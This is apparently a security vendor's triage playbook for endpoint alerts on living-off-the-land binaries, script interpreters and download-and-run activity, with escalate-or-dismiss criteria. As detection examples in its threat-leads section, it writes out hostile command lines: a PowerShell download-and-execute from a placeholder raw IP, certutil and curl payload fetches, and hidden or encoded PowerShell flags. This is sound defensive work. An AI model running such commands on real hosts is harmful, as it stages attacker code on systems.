---
name: Endpoint Execution Payload Delivery
description: Triage a host execution alert where a built-in system binary, a
  script interpreter, or a signed tool is used to run or fetch code —
  living-off-the-land binaries, download-and-run command lines, script hosts,
  and dropped or staged payloads. Reads the process tree and command line to
  tell normal admin, deployment, and developer activity apart from an attacker
  staging code on the host, and decides escalate or dismiss.
type: triage
version: 1.0.0
metadata:
  author: Vega Security
  labels:
    - endpoint
    - lolbin
    - payload-delivery
    - script-execution
    - proxy-execution
---

# Triage Steps

This class fires on tools that are normal by themselves — script interpreters, built-in system utilities, and signed programs that can be told to run other code. They run all day in real admin, deployment, and developer work, so the fact that one of them ran is not the signal. The signal is the story around it: which program launched it, what the command line was reaching for, and where the file lived. An attacker "lives off the land" with these tools precisely because they blend in, so triage here is reading that story and deciding whether it looks like routine operations or like someone staging code on the host.

Begin with this detection's track record on this user and host — a rule that fires daily and is always closed benign starts the call near dismiss — then read the command line and process tree for the leads below. None is required on its own; they stack, and a single strong one (a remote download piped into an interpreter, an encoded command) can carry the call.

**Leads that point to a real threat** — what to look for in the data:

- **Parent process.** A document, browser, mail client, web server, or script host spawning an interpreter: `winword.exe` or `outlook.exe` → `powershell.exe`, `w3wp.exe` → `cmd.exe`, `mshta.exe` running inline script. Interpreters are normally launched by a shell, a management agent, or an installer — not by an email attachment's parent.
- **Download wired into execution.** A fetch and a run on one line: `IEX (New-Object Net.WebClient).DownloadString('http://<raw-ip>/a.ps1')`, `certutil -urlcache -f http://… payload.exe`, `curl … -o %TEMP%\x.exe`. A malicious or suspicious verdict on the address or the fetched file's hash makes it stronger; a never-seen address still adds weight — you can act without a confirmed match.
- **Wrong place or wrong name.** Running out of `…\AppData\Local\Temp`, `\Downloads`, `%PUBLIC%`, or `C:\ProgramData` for something that isn't a managed agent, or a file renamed to look like a system tool (`svch0st.exe`, a `.scr`, a double extension). Real system tools run from their install paths under their real names.
- **Encoded or hidden commands.** `powershell -enc <base64>`, `-w hidden -nop`, characters stitched together with `^` or `set` variables, a `FromBase64String` decode feeding a second interpreter. Deployment tooling also encodes commands for transport, so encoding alone is not the tell — it escalates when the decoded content is unrecognized and no verified deployment identity or documented rollout explains it.

**Leads that rule it out** — benign context you can actually see in the data; if the data doesn't show it, you don't have it:

- **The actor explains it.** A confirmed IT/admin identity or a service account whose role and history include this exact action — the identity directory (Graph/Okta users) confirms the role, not the account name.
- **It matches the host's baseline.** The same program, command shape, and parent have run here before as normal activity, on a host whose role in the asset inventory (Axonius, managed-devices) fits — a developer machine or build server runs interpreters all day.
- **Signed, from its real install path.** Vendor-signed and running from `C:\Program Files\…`, not a copy dropped in a user or temp folder.
- **Fleet-wide, from a verified deployment identity.** The identical command and path appear across many hosts, run by a named deployment or management tool identity on a documented deploy or patch cadence — breadth alone is not enough, since an intrusion can push the same payload to many hosts too; a new payload this cycle from a confirmed deployment identity on record still counts.
- **Clean history.** This rule has closed benign on this user or host before, with nothing new in the command line this time.

To confirm a lead instead of guessing, pull the thread: did a child process, a new file on disk, or an outbound connection to an unusual place follow in the same window? Corroboration turns a suspicious command line into a confirmed one.

# Output

## Decision
- **escalate:** a parent that shouldn't run code, a download-into-execution, a wrong-place or disguised file, or an encoded command — especially two together, or any one with corroborating activity after it.
- **dismiss:** a known admin or service account, a baseline match, a fleet-wide rollout from a verified deployment identity, or a signed binary from its install path explains it, and there is no remote fetch, odd path, or unverified encoded command. A dismiss is a positive call that the execution is benign, made with that context in hand — a service account's documented role you verified, a repeat command shape you actually saw; an actor you couldn't confirm or a baseline you couldn't establish is not that context, and absence of a bad sign is not proof it's good. Dismiss is logged and reopenable; when the parent or path looks wrong, nothing explains it, or you're unsure, escalate.

## Evidence
The full command line and any address or hash in it, the parent program and its signer and path, where the file ran from, the actor's role (admin or service vs ordinary user), whether it matches the host baseline or a fleet-wide rollout, and how this rule was handled here before.

## Reasoning
Name the leads that decided it and how they stacked — an email-spawned interpreter pulling a script from a raw IP into memory is escalate on its own; a signed agent running its normal command across the fleet is dismiss.
